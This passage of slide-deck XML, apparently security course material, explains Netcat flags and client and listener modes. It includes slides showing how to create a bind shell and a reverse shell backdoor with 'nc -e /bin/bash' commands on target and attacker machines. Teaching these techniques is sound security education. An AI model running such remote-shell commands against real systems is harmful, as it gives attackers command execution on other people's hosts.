                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-e: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>program to be executed after connection occurs</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-n: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>don’t resolve name of the machines on the other side</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-z: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>zero I/O mode. TCP: just complete the three way handshake, no data transfer. UDP: just emit a UDP packet without payload (just the packet header)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-wN: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>timeout for connections, wait for N seconds. Netcat will wait for N seconds to make a connection. Netcat stop running if the connection doesn’t happen in that time. If a connection does occur, netcat sends or retrieves data. When no data is transmitted for a total of N seconds, netcat stop running</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Google Shape;147;p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Netcat Usage Continued</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name="Google Shape;153;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="714101" y="1707744"/>
            <a:ext cx="6347714" cy="3880773"/>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000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Clients initiate connections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –nv [targetIP] [remote_port(s)]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-44450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Listeners wait for connections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –lvp [local_port]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p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155" name="Google Shape;155;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1110018" y="4380931"/>
            <a:ext cx="1883391" cy="92333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Netcat (client mode initiates a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Google Shape;156;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1996966" y="3883572"/>
            <a:ext cx="99848" cy="497359"/>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7" name="Google Shape;157;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1996966" y="5304261"/>
            <a:ext cx="99848" cy="497359"/>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8" name="Google Shape;158;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2993409" y="4790024"/>
            <a:ext cx="727253" cy="105144"/>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59" name="Google Shape;159;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483746" y="4294538"/>
            <a:ext cx="1883391" cy="92333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Netcat (listen mode waits for a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7386802" y="3793634"/>
            <a:ext cx="99848" cy="497359"/>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1" name="Google Shape;161;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7425441" y="5217868"/>
            <a:ext cx="99848" cy="497359"/>
          </a:xfrm>
          <a:prstGeom prst="down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2" name="Google Shape;162;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5756493" y="4768831"/>
            <a:ext cx="727253" cy="105144"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj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3" name="Google Shape;163;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1689224" y="3548244"/>
            <a:ext cx="9412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Std In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Google Shape;164;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7054645" y="3463464"/>
            <a:ext cx="94128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Std In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Google Shape;165;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1592317" y="5801620"/>
            <a:ext cx="12980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Std Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166" name="Google Shape;166;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7010400" y="5724413"/>
            <a:ext cx="129802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Std Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="Google Shape;167;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3845688" y="4363282"/>
            <a:ext cx="1830879" cy="1021386"/>
          </a:xfrm>
          <a:prstGeom prst="cloud">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt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68" name="Google Shape;168;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4060264" y="4637422"/>
            <a:ext cx="2109363" cy="36796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The Network</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9"/>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Use Netcat to Create a Bind Shell (Backdoor)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Google Shape;174;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609597" y="2165308"/>
            <a:ext cx="6347714" cy="3880773"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="45700">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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a:p>
            <a:pPr indent="-44450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Target machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –lvp 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Attacker machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –nv 192.168.1.2 4444</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;p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76" name="Google Shape;176;p9"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3049489" y="1384039"/>
            <a:ext cx="4989053" cy="2099089"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="177" name="Google Shape;177;p9"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="879938" y="5511192"/>
            <a:ext cx="755970" cy="774259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="178" name="Google Shape;178;p9"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5432388" y="5480710"/>
            <a:ext cx="402371" cy="835224"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="179" name="Google Shape;179;p9"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3344504" y="5349635"/>
            <a:ext cx="438950" cy="1097375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="180" name="Google Shape;180;p9"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="177" idx="3"/>
            <a:endCxn id="178" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1635908" y="5898322"/>
            <a:ext cx="3796500" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:miter lim="800000"/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Google Shape;181;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3178628" y="6406488"/>
            <a:ext cx="1149531" cy="230832"/>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Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Allows port 4444</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;182;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879938" y="6280989"/>
            <a:ext cx="1419125" cy="507831"/>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Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>nc Target_IP 4444</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="9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US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Type commands here!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="183" name="Google Shape;183;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029282" y="4620790"/>
            <a:ext cx="1672046" cy="78483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900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Protected Server</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="9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US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>nc –lvp 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="9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US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Commands executed here!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Use Netcat to Create a Reverse Shell (Backdoor)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="Google Shape;189;p1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38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Target machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –nv 198.168.1.1 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Attacker machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
